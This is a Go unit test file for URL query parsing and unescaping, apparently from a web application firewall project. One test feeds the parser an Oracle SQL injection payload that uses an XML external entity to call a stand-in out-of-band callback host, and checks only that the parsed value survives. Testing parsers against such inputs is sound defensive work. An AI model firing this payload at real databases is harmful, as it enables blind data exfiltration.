// Copyright 2022 Juan Pablo Tosso
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package url

import (
	"testing"
)

func TestUrlPayloads(t *testing.T) {
	out := `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
	q := ParseQuery(out, '&')
	if len(q["var"]) == 0 {
		t.Error("var is empty")
	}
}

func TestQueryUnescape(t *testing.T) {
	payloads := map[string]string{
		"sample":    "sample",
		"s%20ample": "s ample",
		"s+ample":   "s ample",
		"s%2fample": "s/ample",
		"s% ample":  "s% ample",  // non-strict sample
		"s%ssample": "s%ssample", // non-strict sample
		"s%00ample": "s\x00ample",
	}
	for k, v := range payloads {
		if out := QueryUnescape(k); out != v {
			t.Errorf("Error parsing %q, got %q and expected %q", k, out, v)
		}
	}
}
